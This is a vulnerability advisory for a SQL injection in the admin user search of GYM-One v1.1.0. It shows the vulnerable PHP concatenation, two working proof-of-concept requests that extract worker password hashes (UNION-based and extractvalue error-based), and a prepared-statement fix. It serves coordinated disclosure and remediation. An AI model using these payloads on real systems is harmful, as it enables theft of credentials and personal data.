# CVE-2026-55871 — SQL Injection in GYM-One v1.1.0

| Field            | Value                                                                 |
|------------------|-----------------------------------------------------------------------|
| Product          | [GYM-One](https://github.com/mayerbalintdev/GYM-One)                 |
| Version          | v1.1.0                                                                |
| File             | `admin/users/index.php`                                               |
| CVE              | CVE-2026-55871                                                         |
| CWE              | CWE-89 — Improper Neutralization of Special Elements used in SQL Command |
| CVSS 3.1 Vector  | AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H                                  |
| CVSS Score       | 6.5 (Medium)                                                            |
| Auth Required    | Yes (admin session)                                                   |
| Discovered by    | Lennart Hostettler                                                    |
| Date             | 12/06/2026                                                            |

## Description

GYM-One v1.1.0 is vulnerable to SQL Injection in `admin/users/index.php`. The GET parameters
`search_name` and `search_email` are concatenated unsanitized into two separate SQL queries without
prepared statements or parameterization.

**Vulnerable sink 1** — Data query (line 103/106):
```php
$conditions[] = "firstname LIKE '%$search_name%' OR lastname LIKE '%$search_name%'";
$conditions[] = "email LIKE '%$search_email%'";
// ...
$result = $conn->query($sql); // line 113
```

**Vulnerable sink 2** — COUNT/pagination query (line 465/467):
```php
$conditions[] = "firstname LIKE '%$search_name%' OR lastname LIKE '%$search_name%'";
$conditions[] = "email LIKE '%$search_email%'";
// ...
$result = $conn->query($sql); // line 473
```

## Proof of Concept

**PoC 1 — UNION-based data exfiltration (Sink 1)**

Extracts all worker credentials from the `workers` table:

```http
GET /admin/users/?search_email='UNION SELECT 1,username,password_hash,4,5,6,7,8,9,10,11,12,13,14,15 FROM workers-- -
```

Result: The `firstname` column renders the `username` of each worker, `lastname` renders the `password_hash`.

![UNION SELECT exfiltrating worker credentials — bcrypt hash visible in the Keresztnév column](/assets/gymone-sqli.png)

**PoC 2 — Error-based data exfiltration (Sink 2)**

The COUNT query only returns a number, so UNION is not usable. Error-based injection leaks data via
MySQL's `extractvalue()`:

```http
GET /admin/users/?search_name=x' AND extractvalue(1,concat(0x7e,(SELECT password_hash FROM workers LIMIT 1)))-- -
```

Result: MySQL throws an XPath error containing the password hash of the first worker account.

## Impact

An authenticated attacker with admin privileges can:

- Extract all data from any table in the `gymone` database (user PII, password hashes, tickets)
- Potentially write files to the filesystem via `INTO OUTFILE` depending on DB permissions

## Vendor Response

The maintainer responded the same day the report was submitted, patched the vulnerability promptly, and communicated throughout the process in a professional and solution-oriented manner. This is how coordinated disclosure should work.

## Remediation

Replace string concatenation with prepared statements using `bind_param()`:

```php
$where = [];
$bind_types = '';
$bind_values = [];

if (!empty($search_name)) {
    $where[] = "(firstname LIKE ? OR lastname LIKE ?)";
    $bind_types .= 'ss';
    $bind_values[] = "%$search_name%";
    $bind_values[] = "%$search_name%";
}
if (!empty($search_email)) {
    $where[] = "email LIKE ?";
    $bind_types .= 's';
    $bind_values[] = "%$search_email%";
}

$sql = "SELECT * FROM users";
if (!empty($where)) {
    $sql .= " WHERE " . implode(" AND ", $where);
}
$sql .= " LIMIT ?, ?";
$bind_types .= 'ii';
$bind_values[] = $start_from;
$bind_values[] = $per_page;

$stmt = $conn->prepare($sql);
$stmt->bind_param($bind_types, ...$bind_values);
$stmt->execute();
$result = $stmt->get_result();
```
